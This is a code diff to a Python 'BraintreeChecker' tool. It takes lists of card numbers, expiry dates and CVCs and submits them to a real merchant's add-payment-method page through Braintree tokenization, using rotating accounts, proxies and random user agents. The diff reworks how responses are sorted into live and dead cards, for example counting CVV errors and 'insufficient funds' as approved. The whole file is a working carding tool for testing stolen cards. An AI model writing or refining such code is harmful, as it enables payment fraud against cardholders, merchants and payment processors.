@@ -119,106 +119,51 @@ class BraintreeChecker:
             'emoji': ''
         }
 
-    def extract_processor_response(self, error_text):
-        """Extract processor response from Braintree error - Enhanced version"""
-        try:
-            # Look for processorResponse in JSON with various patterns
-            patterns = [
-                r'"processorResponse":{"code":"(\d+)","message":"([^"]+)"',
-                r'"processorResponse":\s*{\s*"code":\s*"(\d+)",\s*"message":\s*"([^"]+)"',
-                r'"processorResponse":\s*{\s*"code":\s*"(\d+)".*?"message":\s*"([^"]+)"',
-            ]
-            
-            for pattern in patterns:
-                processor_match = re.search(pattern, error_text, re.DOTALL)
-                if processor_match:
-                    code = processor_match.group(1)
-                    message = processor_match.group(2)
-                    return {'code': code, 'message': message}
-            
-            # Look for gatewayRejectionReason
-            rejection_match = re.search(r'"gatewayRejectionReason":"([^"]+)"', error_text)
-            if rejection_match:
-                reason = rejection_match.group(1)
-                return {'code': 'GATEWAY', 'message': f'Gateway Rejection: {reason}'}
-                
-        except:
-            pass
-        return None
-
-    def extract_braintree_error_details(self, error_text):
-        """Extract detailed Braintree error information"""
-        try:
-            # Try to parse as JSON first
-            error_data = json.loads(error_text)
-            
-            # Check for errors array
-            if 'errors' in error_data:
-                error = error_data['errors'][0]
-                code = error.get('extensions', {}).get('errorClass', 'UNKNOWN')
-                message = error.get('message', 'Unknown error')
-                return code, message
-            
-            # Check for processor response
-            if 'data' in error_data and 'tokenizeCreditCard' in error_data['data']:
-                if 'errors' in error_data['data']['tokenizeCreditCard']:
-                    error = error_data['data']['tokenizeCreditCard']['errors'][0]
-                    code = error.get('extensions', {}).get('errorClass', 'UNKNOWN')
-                    message = error.get('message', 'Unknown error')
-                    return code, message
-                    
-        except:
-            pass
-        
-        # Fallback to regex extraction
-        processor_response = self.extract_processor_response(error_text)
-        if processor_response:
-            return processor_response['code'], processor_response['message']
-        
-        return None, None
-
-    def determine_result_from_response(self, code, message):
-        """Determine if response should be APPROVED or DECLINED based on code and message"""
-        message_lower = message.lower()
+    def determine_result_from_response(self, response_message):
+        """Determine if response should be APPROVED or DECLINED based on message"""
+        response_lower = response_message.lower()
         
         # APPROVED scenarios (including CVC issues, 3D secure, etc.)
-        approved_codes = ['2010', '2011']  # CVV issues, Voice auth required
         approved_indicators = [
-            'cvv', 'security code', 'cvc', 'verification', 
-            'authentication required', '3d secure'
+            'payment method successfully added',
+            'payment method added',
+            'successfully added',
+            'cvv',
+            'security code', 
+            'cvc',
+            '2010',  # Card Issuer Declined CVV
+            '2011',  # Voice Authorization Required
+            '3d secure',
+            'authentication required',
+            'do not honor',  # Sometimes approved for CCN
+            'insufficient funds'  # Sometimes approved for CCN
         ]
         
-        # Check if code indicates approval
-        if code in approved_codes:
-            return 'APPROVED'
-        
-        # Check if message contains approved indicators
+        # Check if any approved indicator is present
         for indicator in approved_indicators:
-            if indicator in message_lower:
+            if indicator in response_lower:
                 return 'APPROVED'
         
         # DECLINED scenarios
-        declined_codes = [
-            '2000', '2001', '2002', '2003', '2004', '2005', '2006',
-            '2007', '2008', '2009', '2012', '2013', '2014', '2015',
-            '2016', '2017', '2018', '2019', '2020', '2021', '2022',
-            '2023', '2024', '2044', '2046', '2056', '2059', '2108'
+        declined_indicators = [
+            'invalid card number',
+            'expired card',
+            'stolen card',
+            'lost card',
+            'pick up card',
+            'no such issuer',
+            'invalid merchant',
+            'restricted card',
+            'closed card',
+            '2108'  # Closed Card code
         ]
         
-        if code in declined_codes:
-            return 'DECLINED'
+        for indicator in declined_indicators:
+            if indicator in response_lower:
+                return 'DECLINED'
         
         # Default to DECLINED if no specific indicators found
         return 'DECLINED'
-
-    def format_response_message(self, code, message):
-        """Format the response message like in finalb3mass11.py"""
-        if code and message:
-            return f"Status code {code}: {message}"
-        elif message:
-            return message
-        else:
-            return "Unknown error"
     
     async def check_single_card(self, card_line):
         """Check a single card with account rotation"""
@@ -330,7 +275,7 @@ ERROR ❌
 """
     
     async def process_card(self, cc, mm, yy, cvc, account, proxies=None):
-        """Process a single card with given account and proxy - Using finalb3mass11.py response extraction"""
+        """Process a single card with given account and proxy - EXACT response extraction from finalb3mass11.py"""
         try:
             user = generate_user_agent()
             
@@ -485,23 +430,26 @@ ERROR ❌
                 if 'data' not in response.json() or 'tokenizeCreditCard' not in response.json()['data']:
                     error_text = response.text
                     
-                    # Extract detailed error information
-                    code, message = self.extract_braintree_error_details(error_text)
+                    # Extract processor response like in original file
+                    processor_response = self.extract_processor_response(error_text)
+                    if processor_response:
+                        code = processor_response['code']
+                        message = processor_response['message']
+                        formatted_response = f"Status code {code}: {message}"
+                        result = self.determine_result_from_response(formatted_response)
+                        return result, formatted_response
                     
-                    if code and message:
-                        result = self.determine_result_from_response(code, message)
-                        formatted_message = self.format_response_message(code, message)
-                        return result, formatted_message
-                    else:
-                        # If no specific code found, check for errors in response
-                        if 'errors' in response.json():
-                            error_msg = response.json()['errors'][0].get('message', 'Tokenization failed')
-                            return 'DECLINED', f'Braintree: {error_msg}'
-                        return 'DECLINED', 'Tokenization failed - no token in response'
+                    # If no processor response, check for errors in response
+                    if 'errors' in response.json():
+                        error_msg = response.json()['errors'][0].get('message', 'Tokenization failed')
+                        result = self.determine_result_from_response(error_msg)
+                        return result, f'Braintree: {error_msg}'
+                    
+                    return 'DECLINED', 'Tokenization failed - no token in response'
                         
                 tok = response.json()['data']['tokenizeCreditCard']['token']
 
-                # Step 6: Process payment - FOLLOW REDIRECTS PROPERLY
+                # Step 6: Process payment
                 current_url_str = str(response.url)
                 if 'add-payment-method-custom' in current_url_str:
                     endpoint = 'https://www.tea-and-coffee.com/account/add-payment-method-custom/'
@@ -543,7 +491,7 @@ ERROR ❌
                     follow_redirects=True
                 )
                 
-                # Parse response EXACTLY like in finalb3mass11.py
+                # PARSE RESPONSE EXACTLY LIKE IN finalb3mass11.py
                 response_text = response.text
 
                 # Check for success - EXACT pattern matching from original file
@@ -582,8 +530,32 @@ ERROR ❌
                     
                 return "DECLINED", "DECLINED - Unknown response"
 
+        except httpx.TimeoutException:
+            return 'DECLINED', 'Error: Request timeout'
+        except httpx.NetworkError:
+            return 'DECLINED', 'Error: Network connection failed'
         except Exception as e:
             return 'DECLINED', f'Error: {str(e)}'
+
+    def extract_processor_response(self, error_text):
+        """Extract processor response from Braintree error - EXACTLY like in finalb3mass11.py"""
+        try:
+            # Look for processorResponse in JSON
+            processor_match = re.search(r'"processorResponse":{"code":"(\d+)","message":"([^"]+)"', error_text)
+            if processor_match:
+                code = processor_match.group(1)
+                message = processor_match.group(2)
+                return {'code': code, 'message': message}
+            
+            # Look for gatewayRejectionReason
+            rejection_match = re.search(r'"gatewayRejectionReason":"([^"]+)"', error_text)
+            if rejection_match:
+                reason = rejection_match.group(1)
+                return {'code': 'GATEWAY', 'message': f'Gateway Rejection: {reason}'}
+                
+        except:
+            pass
+        return None
 
 # Global checker instance
 braintree_checker = BraintreeChecker()
